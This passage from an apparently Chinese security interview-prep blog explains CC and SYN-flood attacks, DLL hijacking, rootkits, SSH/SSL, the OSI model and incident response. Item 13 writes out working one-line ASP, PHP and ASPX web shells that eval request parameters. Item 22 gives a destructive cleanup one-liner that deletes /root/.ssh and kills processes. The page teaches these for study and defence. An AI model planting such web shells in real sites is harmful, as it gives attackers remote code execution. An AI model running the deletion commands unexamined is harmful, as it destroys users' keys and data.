+<h3 id="4-什么是CC攻击？"><a href="#4-什么是CC攻击？" class="headerlink" title="4.什么是CC攻击？"></a>4.什么是CC攻击？</h3><p>这个也是知道一些，知道他是DDos的变种，正常请求伪造，服务器资源耗尽，最终还是看看百科答案吧：CC攻击是DDOS（分布式拒绝服务）的一种，相比其它的DDOS攻击CC似乎更有技术含量一些。这种攻击你见不到真实源IP，见不到特别大的异常流量，但造成服务器无法进行正常连接。CC攻击的原理就是攻击者控制某些主机不停地发大量数据包给对方服务器造成服务器资源耗尽，一直到宕机崩溃。CC主要是用来攻击页面的，每个人都有这样的体验：当一个网页访问的人数特别多的时候，打开网页就慢了，CC就是模拟多个用户（多少线程就是多少用户）不停地进行访问那些需要大量数据操作（就是需要大量CPU时间）的页面，造成服务器资源的浪费，CPU长时间处于100%，永远都有处理不完的连接直至就网络拥塞，正常的访问被中止。</p>
+<h3 id="5-Web服务器被入侵后，怎样进行排查？"><a href="#5-Web服务器被入侵后，怎样进行排查？" class="headerlink" title="5.Web服务器被入侵后，怎样进行排查？"></a>5.Web服务器被入侵后，怎样进行排查？</h3><p>最简单就是</p>
+<p>查看下web 服务器日志<br>看看有没有异常端口开放<br>使用安全狗等服务器安全软件清扫</p>
+<h3 id="6-dll文件是什么意思，有什么用？"><a href="#6-dll文件是什么意思，有什么用？" class="headerlink" title="6.dll文件是什么意思，有什么用？"></a>6.dll文件是什么意思，有什么用？</h3><p>DLL（Dynamic Link Library）文件，即动态链接库，也有人称作应用程序拓展。</p>
+<p>Windows应用程序中，实行了模块化设计，也就是说并不是每个应用程序都编写完所有的功能代码，而是在运行过程中调用相应功能的DLL，不需运行的功能就不调用，所以大大加快了程序的加载速度和效率，其他应用程序也可以调用相关的DLL，这样也有利于促进代码重用以及内存使用效率，减少了资源占用，而且程序更新时也只要更新相关的DLL就可以了。</p>
+<p>要注意的是，有些病毒也会伪装成DLL文件，并替换系统的DLL文件，需要我们防范。</p>
+<p>DLL劫持原理</p>
+<p>由于输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索DLL文件。首先会尝试从当前程序所在的目录加载DLL，如果没找到，则在Windows系统目录中查找，最后是在环境变量中列出的各个目录下查找。利用这个特点，先伪造一个系统同名的DLL，提供同样的输出表，每个输出函数转向真正的系统DLL。程序调用系统DLL时会先调用当前目录下伪造的DLL，完成相关功能后，再跳到系统DLL同名函数里执行。这个过程用个形象的词来描述就是系统DLL被劫持（hijack）了。</p>
+<p>伪造的dll制作好后，放到程序当前目录下，这样当原程序调用原函数时就调用了伪造的dll的同名函数，进入劫持DLL的代码，处理完毕后，再调用原DLL此函数。</p>
+<p>如何防止DLL劫持<br>DLL劫持利用系统未知DLL的搜索路径方式，使得程序加载当前目录下的系统同名DLL。所以可以告诉系统DLL的位置，改变加载系统DLL的顺序不是当前目录，而是直接到系统目录下查找。</p>
+<h3 id="7-0day漏洞"><a href="#7-0day漏洞" class="headerlink" title="7.0day漏洞"></a>7.0day漏洞</h3><p>是已经发现但是官方还没发布补丁的漏洞。</p>
+<p>信息安全意义上的0Day是指在安全补丁发布前而被了解和掌握的漏洞信息。</p>
+<h3 id="8-Rootkit是什么意思"><a href="#8-Rootkit是什么意思" class="headerlink" title="8.Rootkit是什么意思"></a>8.Rootkit是什么意思</h3><p>Rootkit是一种特殊类型的 malware（恶意软件）。Rootkit 之所以特殊是因为您不知道它们在做什么事情。Rootkit基本上是无法检测到的，而且几乎不可能删除它们。虽然检测工具在不断增多，但是恶意软件的开发者也在不断寻找新的途径来掩盖他们的踪迹。</p>
+<p>Rootkit的目的在于隐藏自己以及其他软件不被发现。它可以通过阻止用户识别和删除攻击者的软件来达到这个目的。Rootkit 几乎可以隐藏任何软件，包括文件服务器、键盘记录器、Botnet 和Remailer。许多Rootkit 甚至可以隐藏大型的文件集合并允许攻击者在您的计算机上保存许多文件，而您无法看到这些文件。</p>
+<p>Rootkit本身不会像病毒或蠕虫那样影响计算机的运行。攻击者可以找出目标系统上的现有漏洞。漏洞可能包括：开放的网络端口、未打补丁的系统或者具有脆弱的管理员密码的系统。在获得存在漏洞的系统的访问权限之后，攻击者便可手动安装一个 Rootkit。这种类型的偷偷摸摸的攻击通常不会触发自动执行的网络安全控制功能，例如入侵检测系统。</p>
+<p>找出 Rootkit 十分困难。有一些软件包可以检测 Rootkit。这些软件包可划分为以下两类：基于签名的检查程序和基于行为的检查程序。基于签名（特征码）的检查程序，例如大多数病毒扫描程序，会检查二进制文件是否为已知的 Rootkit。基于行为的检查程序试图通过查找一些代表 Rootkit 主要行为的隐藏元素来找出 Rootkit。一个流行的基于行为的 Rootkit 检查程序是 Rootkit Revealer.</p>
+<p>在发现系统中存在 Rootkit 之后，能够采取的补救措施也较为有限。由于Rootkit 可以将自身隐藏起来，所以您可能无法知道它们已经在系统中存在了多长的时间。而且您也不知道 Rootkit 已经对哪些信息造成了损害。对于找出的 Rootkit，最好的应对方法便是擦除并重新安装系统。虽然这种手段很严厉，但是这是得到证明的唯一可以彻底删除 Rootkit 的方法。</p>
+<p>防止 Rootkit 进入您的系统是能够使用的最佳办法。为了实现这个目的，可以使用与防范所有攻击计算机的恶意软件一样的深入防卫策略。深度防卫的要素包括：病毒扫描程序、定期更新软件、在主机和网络上安装防火墙，以及强密码策略</p>
+<h3 id="9-蜜罐"><a href="#9-蜜罐" class="headerlink" title="9.蜜罐"></a>9.蜜罐</h3><p>蜜罐好比是情报收集系统。蜜罐好像是故意让人攻击的目标，引诱黑客前来攻击。所以攻击者入侵后，你就可以知道他是如何得逞的，随时了解针对服务器发动的最新的攻击和漏洞。还可以通过窃听黑客之间的联系，收集黑客所用的种种工具，并且掌握他们的社交网络。</p>
+<h3 id="10-ssh"><a href="#10-ssh" class="headerlink" title="10.ssh"></a>10.ssh</h3><p>SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH。</p>
+<p>传统的网络服务程序，如：ftp、pop和telnet在本质上都是不安全的，因为它们在网络上用明文传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。而且，这些服务程序的安全验证方式也是有其弱点的，就是很容易受到“中间人”（man-in-the-middle）这种方式的攻击。所谓“中间人”的攻击方式，就是“中间人”冒充真正的服务器接收你传给服务器的数据，然后再冒充你把数据传给真正的服务器。服务器和你之间的数据传送被“中间人”一转手做了手脚之后，就会出现很严重的问题。通过使用SSH，你可以把所有传输的数据进行加密，这样”中间人”这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、PoP、甚至为PPP提供一个安全的”通道”。</p>
+<p>英文全称是Secure Shell。通过使用SSH，你可以把所有传输的数据进行加密，这样”中间人”这种攻击方式就不可能实现了，而且也能够防止DNS和IP欺骗。还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。 SSH有很多功能，它既可以代替telnet，又可以为ftp、pop、甚至ppp提供一个安全的”通道”。</p>
+<p>SSH是由客户端和服务端的软件组成的，有两个不兼容的版本分别是：1.x和2.x。用SSH 2.x的客户程序是不能连接到SSH 1.x的服务程序上去的。OpenSSH 2.x同时支持SSH 1.x和2.x。SSH的安全验证是如何工作的从客户端来看，SSH提供两种级别的安全验证。第一种级别（基于口令的安全验证）只要你知道自己帐号和口令，就可以登录到远程主机。所有传输的数据都会被加密，但是不能保证你正在连接的服务器就是你想连接的服务器。可能会有别的服务器在冒充真正的服务器，也就是受到“中间人”这种方式的攻击。第二种级别（基于密匙的安全验证）需要依靠密匙，也就是你必须为自己创建一对密匙，并把公用密匙放在需要访问的服务器上。如果你要连接到SSH服务器上，客户端软件就会向服务器发出请求，请求用你的密匙进行安全验证。服务器收到请求之后，先在你在该服务器的家目录下寻找你的公用密匙，然后把它和你发送过来的公用密匙进行比较。如果两个密匙一致，服务器就用公用密匙加密“质询”（challenge）并把它发送给客户端软件。客户端软件收到“质询”之后就可以用你的私人密匙解密再把它发送给服务器。用这种方式，你必须知道自己密匙的口令。但是，与第一种级别相比，第二种级别不需要在网络上传送口令。第二种级别不仅加密所有传送的数据，而且“中间人”这种攻击方式也是不可能的（因为他没有你的私人密匙）。但是整个登录的过程可能需要10秒。</p>
+<p>SSL(SecureSockets Layer (SSL) and Transport Layer Security (TLS))被设计为加强Web安全传输(HTTP/HTTPS/)的协议(事实上还有SMTP/NNTP等),SSH(Secure Shell)更多的则被设计为加强Telnet/FTP安全的传输协议,默认地,它使用22端口.</p>
+<p>以SSL为例,基本上SSL在传输过程中所处的位置如下:</p>
+<p>－－－－－－－－－</p>
+<p>|HTTP |</p>
+<p>－－－－－－－－－</p>
+<p>| SSL|</p>
+<p>－－－－－－－－－</p>
+<p>| TCP|</p>
+<p>－－－－－－－－－</p>
+<p>| IP|</p>
+<p>－－－－－－－－－</p>
+<p>如果利用SSL协议来访问网页，其步骤如下：</p>
+<p>用户：在浏览器的地址栏里输入<a href="https://www.sslserver.com" target="_blank" rel="noopener">https://www.sslserver.com</a></p>
+<p>HTTP层：将用户需求翻译成HTTP请求，如</p>
+<p>GET/index.htm HTTP/1.1</p>
+<p>Host<a href="http://www.sslserver.com" target="_blank" rel="noopener">http://www.sslserver.com</a></p>
+<p>SSL层: 借助下层协议的的信道安全的协商出一份加密密钥，并用此密钥来加密HTTP请求。</p>
+<p>TCP层：与web server的443端口建立连接，传递SSL处理后的数据。</p>
+<p>接收端与此过程相反。</p>
+<p>SSL在TCP之上建立了一个加密通道，通过这一层的数据经过了加密，因此达到保密的效果。</p>
+<p>SSL协议分为两部分：Handshake Protocol和Record Protocol,。其中Handshake Protocol用来协商密钥，协议的大部分内容就是通信双方如何利用它来安全的协商出一份密钥。 Record Protocol则定义了传输的格式。</p>
+<h3 id="11-DDOS"><a href="#11-DDOS" class="headerlink" title="11.DDOS"></a>11.DDOS</h3><p><a href="http://baike.baidu.com/link?url=hOeNhuaIj6tF9NY1wr2wbe9pIe52PaCJ5KXTisdfPUK4j8beTktmVsRaH5hRjkcpq6FPouzRl2hbsbpEDO5HRAUYi_D1Tsnu_q7in59xRasqHbmi1oYhEyVDVVn9ZcIcqRsZi5axo_HgkXBPioJx_#10" target="_blank" rel="noopener">http://baike.baidu.com/link?url=hOeNhuaIj6tF9NY1wr2wbe9pIe52PaCJ5KXTisdfPUK4j8beTktmVsRaH5hRjkcpq6FPouzRl2hbsbpEDO5HRAUYi_D1Tsnu_q7in59xRasqHbmi1oYhEyVDVVn9ZcIcqRsZi5axo_HgkXBPioJx_#10</a></p>
+<p>分布式拒绝服务(DDoS:Distributed Denial ofService)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。</p>
+<h3 id="12-震网病毒："><a href="#12-震网病毒：" class="headerlink" title="12.震网病毒："></a>12.震网病毒：</h3><p>指一种蠕虫病毒，是第一个专门定向攻击真实世界中基础（能源）设施的“蠕虫”病毒，比如核电站，水坝，国家电网。只要电脑操作员将被病毒感染的U盘插入USB接口，这种病毒就会在神不知鬼不觉的情况下(不会有任何其他操作要求或者提示出现)取得一些工业用电脑系统的控制权。</p>
+<p>与传统的电脑病毒相比，“震网”病毒不会通过窃取个人隐私信息牟利。无需借助网络连接进行传播。这种病毒可以破坏世界各国的化工、发电和电力传输企业所使用的核心生产控制电脑软件，并且代替其对工厂其他电脑“发号施令”。极具毒性和破坏力。“震网”代码非常精密，主要有两个功能，一是使伊朗的离心机运行失控，二是掩盖发生故障的情况，“谎报军情”，以“正常运转”记录回传给管理部门，造成决策的误判。</p>
+<h3 id="13-一句话木马"><a href="#13-一句话木马" class="headerlink" title="13.一句话木马"></a>13.一句话木马</h3><p>asp一句话木马：</p>
+<p>&lt;%execute(request(“value”))%&gt;</p>
+<p>php一句话木马：</p>
+<p>&lt;?php@eval($_POST[value]);?&gt;   </p>
+<p>变形：&lt;?php$x=$_GET[‘z’];@eval(“$x;”);?&gt;</p>
+<p>aspx一句话木马：</p>
+<p>&lt;%@ PageLanguage=”Jscript”%&gt;</p>
+<p>&lt;%eval(Request.Item[“value”])%&gt;</p>
+<h3 id="14-Https的作用"><a href="#14-Https的作用" class="headerlink" title="14.Https的作用"></a>14.Https的作用</h3><p>内容加密建立一个信息安全通道，来保证数据传输的安全；</p>
+<p>身份认证确认网站的真实性</p>
+<p>数据完整性防止内容被第三方冒充或者篡改</p>
+<p>HTTPS和HTTP的区别</p>
+<p>https协议需要到CA申请证书。</p>
+<p>http是超文本传输协议，信息是明文传输；https则是具有安全性的ssl加密传输协议。</p>
+<p>http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。</p>
+<p>http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。</p>
+<h3 id="15-手工查找后门木马的小技巧"><a href="#15-手工查找后门木马的小技巧" class="headerlink" title="15.手工查找后门木马的小技巧"></a>15.手工查找后门木马的小技巧</h3><p>1、首先最需要注意的地方是系统的启动项，可以在“运行”-输入“msconfig命令”在打开的系统配置实用程序里的启动列表查看，并且服务也要注意一下，如果对电脑不是太熟悉的童鞋建议使用360安全卫士的开机加速功能，来查看有无异常的可以启动项和服务项，因为在后门木马中99%都会注册自己为系统服务，达到开机自启动的目的，如果发现可疑项直接打开相应的路径，找到程序文件，直接删除并且禁止自启动；</p>
+<p>2、查看系统关键目录system32和系统安装目录Windows下的文件，xp系统下两者默认路径分别是C:\WINDOWS\system32和C:\WINDOWS\。然后最新修改的文件中有没有可疑的可执行文件或dll文件，这两个地方都是木马最喜欢的藏身的地方了（小提示：一定要设置显示所有的文件的文件夹哦）。</p>
+<p>3、观察网络连接是否存在异常，还有“运行”-“cmd”-“netstat -an”查看有没有可疑或非正常程序的网络连接，如果对电脑不是很熟悉建议大家使用360的流量监控功能更加直观和方便，尤其注意一下远程连接的端口，如果有类似于8000等端口就要注意了，8000是灰鸽子的默认端口，记得有一次自己就在后门木马测试中在网络连接中发现8000端口，当然意思不是说只要没有8000端口的网络连接就一定安全，因为8000端口只是灰鸽子上线的默认端口，并且端口是可以更改的。</p>
+<p>通过以上方法，可以查找到电脑的一些可疑文件，如果确认无疑，就可以手工进行删除了。当然还可以借助杀毒软件的力量。如果你真的中了木马后门，不用慌。最好最彻底的方法是重装系统后，在安全模式下，利用最新病毒库的杀软进行查杀。</p>
+<h3 id="16-描述OSI（开放系统互联基本参考模型）七层结构"><a href="#16-描述OSI（开放系统互联基本参考模型）七层结构" class="headerlink" title="16.描述OSI（开放系统互联基本参考模型）七层结构"></a>16.描述OSI（开放系统互联基本参考模型）七层结构</h3><p>分层的好处是利用层次结构可以把开放系统的信息交换问题分解到一系列容易控制的软硬件模块－层中，而各层可以根据需要独立进行修改或扩充功能，同时，有利于个不同制造厂家的设备互连，也有利于大家学习、理解数据通讯网络。</p>
+<p>OSI参考模型中不同层完成不同的功能，各层相互配合通过标准的接口进行通信。</p>
+<p>第7层应用层：OSI中的最高层。为特定类型的网络应用提供了访问OSI环境的手段。应用层确定进程之间通信的性质，以满足用户的需要。应用层不仅要提供应用进程所需要的信息交换和远程操作，而且还要作为应用进程的用户代理，来完成一些为进行信息交换所必需的功能。它包括：文件传送访问和管理FTAM、虚拟终端VT、事务处理TP、远程数据库访问RDA、制造报文规范MMS、目录服务DS等协议；应用层能与应用程序界面沟通，以达到展示给用户的目的。在此常见的协议有:HTTP，HTTPS，FTP，TELNET，SSH，SMTP，POP3等。</p>
+<p>第6层表示层：主要用于处理两个通信系统中交换信息的表示方式。为上层用户解决用户信息的语法问题。它包括数据格式交换、数据加密与解密、数据压缩与终端类型的转换。</p>
+<p>第5层会话层：在两个节点之间建立端连接。为端系统的应用程序之间提供了对话控制机制。此服务包括建立连接是以全双工还是以半双工的方式进行设置，尽管可以在层4中处理双工方式；会话层管理登入和注销过程。它具体管理两个用户和进程之间的对话。如果在某一时刻只允许一个用户执行一项特定的操作，会话层协议就会管理这些操作，如阻止两个用户同时更新数据库中的同一组数据。</p>
+<p>第4层传输层：—常规数据递送－面向连接或无连接。为会话层用户提供一个端到端的可靠、透明和优化的数据传输服务机制。包括全双工或半双工、流控制和错误恢复服务；传输层把消息分成若干个分组，并在接收端对它们进行重组。不同的分组可以通过不同的连接传送到主机。这样既能获得较高的带宽，又不影响会话层。在建立连接时传输层可以请求服务质量，该服务质量指定可接受的误码率、延迟量、安全性等参数，还可以实现基于端到端的流量控制功能。</p>
+<p>第3层网络层：本层通过寻址来建立两个节点之间的连接，为源端的运输层送来的分组，选择合适的路由和交换节点，正确无误地按照地址传送给目的端的运输层。它包括通过互连网络来路由和中继数据；除了选择路由之外，网络层还负责建立和维护连接，控制网络上的拥塞以及在必要的时候生成计费信息。</p>
+<p>第2层数据链路层：在此层将数据分帧，并处理流控制。屏蔽物理层，为网络层提供一个数据链路的连接，在一条有可能出差错的物理连接上，进行几乎无差错的数据传输（差错控制）。本层指定拓扑结构并提供硬件寻址。常用设备有网卡、网桥、交换机；</p>
+<p>第1层物理层：处于OSI参考模型的最底层。物理层的主要功能是利用物理传输介质为数据链路层提供物理连接，以便透明的传送比特流。常用设备有（各种物理设备）集线器、中继器、调制解调器、网线、双绞线、同轴电缆。</p>
+<p>数据发送时，从第七层传到第一层，接收数据则相反。</p>
+<p>上三层总称应用层，用来控制软件方面。下四层总称数据流层，用来管理硬件。除了物理层之外其他层都是用软件实现的。</p>
+<p>数据在发至数据流层的时候将被拆分。</p>
+<p>在传输层的数据叫段，网络层叫包，数据链路层叫帧，物理层叫比特流，这样的叫法叫PDU（协议数据单元）[2]</p>
+<p>各层功能</p>
+<p> (1)物理层(Physical Layer)</p>
+<p>物理层是OSI参考模型的最低层，它利用传输介质为数据链路层提供物理连接。它主要关心的是通过物理链路从一个节点向另一个节点传送比特流，物理链路可能是铜线、卫星、微波或其他的通讯媒介。它关心的问题有：多少伏电压代表1？多少伏电压代表0？时钟速率是多少？采用全双工还是半双工传输？总的来说物理层关心的是链路的机械、电气、功能和规程特性。</p>
+<p>(2)数据链路层(Data Link Layer)</p>
+<p>数据链路层是为网络层提供服务的，解决两个相邻结点之间的通信问题，传送的协议数据单元称为数据帧。</p>
+<p>数据帧中包含物理地址（又称MAC地址）、控制码、数据及校验码等信息。该层的主要作用是通过校验、确认和反馈重发等手段，将不可靠的物理链路转换成对网络层来说无差错的数据链路。</p>
+<p>此外，数据链路层还要协调收发双方的数据传输速率，即进行流量控制，以防止接收方因来不及处理发送方来的高速数据而导致缓冲器溢出及线路阻塞。</p>
+<p>(3)网络层(Network Layer)</p>
+<p>网络层是为传输层提供服务的，传送的协议数据单元称为数据包或分组。该层的主要作用是解决如何使数据包通过各结点传送的问题，即通过路径选择算法（路由）将数据包送到目的地。另外，为避免通信子网中出现过多的数据包而造成网络阻塞，需要对流入的数据包数量进行控制（拥塞控制）。当数据包要跨越多个通信子网才能到达目的地时，还要解决网际互连的问题。</p>
+<p>(4)传输层(Transport Layer)</p>
+<p>传输层的作用是为上层协议提供端到端的可靠和透明的数据传输服务，包括处理差错控制和流量控制等问题。该层向高层屏蔽了下层数据通信的细节，使高层用户看到的只是在两个传输实体间的一条主机到主机的、可由用户控制和设定的、可靠的数据通路。</p>
+<p>传输层传送的协议数据单元称为段或报文。</p>
+<p>(5)会话层(Session Layer)</p>
+<p>会话层主要功能是管理和协调不同主机上各种进程之间的通信（对话），即负责建立、管理和终止应用程序之间的会话。会话层得名的原因是它很类似于两个实体间的会话概念。例如，一个交互的用户会话以登录到计算机开始，以注销结束。</p>
+<p>(6)表示层(Presentation Layer)</p>
+<p>表示层处理流经结点的数据编码的表示方式问题，以保证一个系统应用层发出的信息可被另一系统的应用层读出。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据表示格式转换成网络通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。</p>
+<p>(7)应用层(Application Layer)</p>
+<p>应用层是OSI参考模型的最高层，是用户与网络的接口。该层通过应用程序来完成网络用户的应用需求，如文件传输、收发电子邮件等。</p>
+<h3 id="17-TCP和UDP的区别"><a href="#17-TCP和UDP的区别" class="headerlink" title="17.TCP和UDP的区别"></a>17.TCP和UDP的区别</h3><p>TCP协议和UDP协议特性区别总结：</p>
+<p>1.TCP协议在传送数据段的时候要给段标号；UDP协议不</p>
+<p>2.TCP协议可靠；UDP协议不可靠</p>
+<p>3.TCP协议是面向连接；UDP协议采用无连接</p>
+<p>4.TCP协议负载较高，采用虚电路；UDP采用无连接</p>
+<p>5.TCP协议的发送方要确认接收方是否收到数据段（3次握手协议）</p>
+<p>6.TCP协议采用窗口技术和流控制</p>
+<p>当数据传输的性能必须让位于数据传输的完整性、可控制性和可靠性时，TCP协议是当然的选择。当强调传输性能而不是传输的完整性时，如：音频和多媒体应用，UDP是最好的选择。在数据传输时间很短，以至于此前的连接过程成为整个流量主体的情况下，UDP也是一个好的选择，如：DNS交换。把SNMP建立在UDP上的部分原因是设计者认为当发生网络阻塞时，UDP较低的开销使其有更好的机会去传送管理数据。TCP丰富的功能有时会导致不可预料的性能低下，但是我们相信在不远的将来，TCP可靠的点对点连接将会用于绝大多数的网络应用。</p>
+<h3 id="18-脱壳"><a href="#18-脱壳" class="headerlink" title="18.脱壳"></a>18.脱壳</h3><p>而从技术的角度出发，壳是一段执行于原始程序前的代码。原始程序的代码在加壳的过程中可能被压缩、加密……。当加壳后的文件执行时，壳－这段代码先于原始程序运行，他把压缩、加密后的代码还原成原始程序代码，然后再把执行权交还给原始代码。软件的壳分为加密壳、压缩壳、伪装壳、多层壳等类，目的都是为了隐藏程序真正的OEP（入口点，防止被破解）。</p>
+<p>加壳”指的是对编译好的EXE、DLL等文件采用加壳来进行保护；“脱壳”指的就是将文件外边的壳去除，恢复文件没有加壳前的状态。壳出于程序作者想对程序资源压缩、注册保护的目的，把壳分为压缩壳、密码壳、加密壳三种。顾名思义，压缩壳只是为了减小程序体积对资源进行压缩，常见的压缩壳包括FSG、ASPack、UPX、北斗等；加密壳也就是常说的保护壳、猛壳，它对程序输入表等内容进行加密保护，具有良好的保护效果，常见的加密壳包括ASPROTECT、ACPROTECT、PELock、幻影等；密码壳平时使用得不多，加密壳的程序只有在正确输入密码后才能运行</p>
+<h3 id="19-“人肉搜索”"><a href="#19-“人肉搜索”" class="headerlink" title="19.“人肉搜索”"></a>19.“人肉搜索”</h3><p>是一种类比的称呼，主要是用来区别传统搜索引擎。它主要是指通过集中许多网民的力量去搜索信息和资源的一种方式，它包括利用互联网的机器搜索引擎（如百度等）及利用各网民在日常生活中所能掌握的信息来进行收集信息的一种方式[1]  。</p>
+<h3 id="20-SYN-Flood的基本原理"><a href="#20-SYN-Flood的基本原理" class="headerlink" title="20.SYN Flood的基本原理"></a>20.SYN Flood的基本原理</h3><p>   SYN Flood是当前最流行的DoS（拒绝服务攻击）与DDoS（分布式拒绝服务攻击）的方式之一，这是一种利用TCP协议缺陷，发送大量伪造的TCP连接请求，从而使得被攻击方资源耗尽（CPU满负荷或内存不足）的攻击方式。要明白这种攻击的基本原理，还是要从TCP连接建立的过程开始说起：</p>
+<p>   大家都知道，TCP与UDP不同，它是基于连接的，也就是说：为了在服务端和客户端之间传送TCP数据，必须先建立一个虚拟电路，也就是TCP连接，建立TCP连接的标准过程是这样的：</p>
+<p>   首先，请求端（客户端）发送一个包含SYN标志的TCP报文，SYN即同步（Synchronize），同步报文会指明客户端使用的端口以及TCP连接的初始序号；</p>
+<p>   第二步，服务器在收到客户端的SYN报文后，将返回一个SYN+ACK的报文，表示客户端的请求被接受，同时TCP序号被加一，ACK即确认（Acknowledgement）。</p>
+<p>   第三步，客户端也返回一个确认报文ACK给服务器端，同样TCP序列号被加一，到此一个TCP连接完成。</p>
+<p>   以上的连接过程在TCP协议中被称为三次握手（Three-way Handshake）。问题就出在TCP连接的三次握手中，假设一个用户向服务器发送了SYN报文后突然死机或掉线，那么服务器在发出SYN+ACK应答报文后是无法收到客户端的ACK报文的（第三次握手无法完成），这种情况下服务器端一般会重试（再次发送SYN+ACK给客户端）并等待一段时间后丢弃这个未完成的连接，这段时间的长度我们称为SYN Timeout，一般来说这个时间是分钟的数量级（大约为30秒-2分钟）；一个用户出现异常导致服务器的一个线程等待1分钟并不是什么很大的问题，但如果有一个恶意的攻击者大量模拟这种情况，服务器端将为了维护一个非常大的半连接列表而消耗非常多的资源—-数以万计的半连接，即使是简单的保存并遍历也会消耗非常多的CPU时间和内存，何况还要不断对这个列表中的IP进行SYN+ACK的重试。实际上如果服务器的TCP/IP栈不够强大，最后的结果往往是堆栈溢出崩溃—即使服务器端的系统足够强大，服务器端也将忙于处理攻击者伪造的TCP连接请求而无暇理睬客户的正常请求（毕竟客户端的正常请求比率非常之小），此时从正常客户的角度看来，服务器失去响应，这种情况我们称作：服务器端受到了SYN Flood攻击（SYN洪水攻击）。</p>
+<p>从防御角度来说，有几种简单的解决方法，第一种是缩短SYNTimeout时间，由于SYNFlood攻击的效果取决于服务器上保持的SYN半连接数，这个值=SYN攻击的频度 x SYN Timeout，所以通过缩短从接收到SYN报文到确定这个报文无效并丢弃改连接的时间，例如设置为20秒以下（过低的SYN Timeout设置可能会影响客户的正常访问），可以成倍的降低服务器的负荷。</p>
+<p>  第二种方法是设置SYN Cookie，就是给每一个请求连接的IP地址分配一个Cookie，如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，以后从这个IP地址来的包会被一概丢弃。</p>
+<p>可是上述的两种方法只能对付比较原始的SYNFlood攻击，缩短SYNTimeout时间仅在对方攻击频度不高的情况下生效，SYN Cookie更依赖于对方使用真实的IP地址，如果攻击者以数万/秒的速度发送SYN报文，同时利用SOCK_RAW随机改写IP报文中的源地址，以上的方法将毫无用武之地。</p>
+<h3 id="21-什么是手机”越狱“"><a href="#21-什么是手机”越狱“" class="headerlink" title="21.什么是手机”越狱“"></a>21.什么是手机”越狱“</h3><p>所谓iOS系统的越狱就是取得系统最高权限的行为，越狱前后iOS系统本身并不会发生质的改变，只是越狱后可以对iOS系统进行更充分的利用而已。</p>
+<p>越狱的好处：</p>
+<p>1、越狱之后操作性更强，取得了手机的最高权限，就可以修改手机内容，包括安装免费的破解软件、自定义功能、美化等等。</p>
+<p>2、越狱后可以绕过AppStore免费下载APP。</p>
+<p>越狱的坏处：</p>
+<p>1、越狱后失去保修。</p>
+<p>2、越狱之后，后台程序运行，桌面主题等都会加大耗电。</p>
+<p>3、越狱就是打破iOS系统封闭，所以手机就相对变得不安全了。</p>
+<h3 id="22-主机被入侵，你会如何处理这件事自查解决方案："><a href="#22-主机被入侵，你会如何处理这件事自查解决方案：" class="headerlink" title="22.主机被入侵，你会如何处理这件事自查解决方案："></a>22.主机被入侵，你会如何处理这件事自查解决方案：</h3><p>1、病毒木马排查。</p>
+<p>1.1、使用netstat查看网络连接，分析是否有可疑发送行为，如有则停止。(linux常见木马，清理命令chattr-i /usr/bin/.sshd; rm -f /usr/bin/.sshd; chattr -i /usr/bin/.swhd; rm -f/usr/bin/.swhd; rm -f -r /usr/bin/bsd-port; cp /usr/bin/dpkgd/ps /bin/ps; cp/usr/bin/dpkgd/netstat /bin/netstat; cp /usr/bin/dpkgd/lsof /usr/sbin/lsof; cp/usr/bin/dpkgd/ss /usr/sbin/ss;rm -r -f /root/.ssh; rm -r -f/usr/bin/bsd-port;find /proc/ -name exe | xargs ls -l | grep -v task |grepdeleted| awk ‘{print $11}’ | awk -F/ ‘{print $NF}’ | xargs killall -9;）　　</p>
+<p>1.2、使用杀毒软件进行病毒查杀。</p>
+<p>2、服务器漏洞排查并修复</p>
+<p>2.1、查看服务器账号是否有异常，如有则停止删除掉。</p>
+<p>2.2、查看服务器是否有异地登录情况，如有则修改密码为强密码（字每+数字+特殊符号）大小写，10位及以上。</p>
+<p>2.3、查看Jenkins、Tomcat、PhpMyadmin、WDCP、Weblogic后台密码，提高密码强度（字每+数字+特殊符号）大小写，10位及以上。</p>
+<p>2.4、查看WEB应用是否有漏洞，如struts, ElasticSearch等，如有则请升级。</p>
+<p>2.5、查看MySQL、SQLServer、FTP、WEB管理后台等其它有设置密码的地方，提高密码强度（字每+数字+特殊符号）大小写，10位及以上。</p>
+<p>2.6、查看Redis无密码可远程写入文件漏洞，检查/root/.ssh/下黑客创建的SSH登录密钥文件，删除掉，修改Redis为有密码访问并使用强密码，不需要公网访问最好bind127.0.0.1本地访问。</p>
+<p>2.7、如果有安装第三方软件，请按官网指引进行修复。</p>
+<p>3、开启云盾服务，并开启所有云盾安全防护功能对您的主机进行安全防护，免于再次遭到恶意攻击。</p>
+<p>实施安全防御方案</p>
+<p>请您尽快开启云盾服务，开启步骤详见：<a href="http://help.aliyun.com/view/11108300_13730770.html" target="_blank" rel="noopener">http://help.aliyun.com/view/11108300_13730770.html</a></p>
+<p>同时也建议您开启云盾应用防火墙功能，开启步骤详见：</p>
+<p>4、如果问题仍未解决</p>
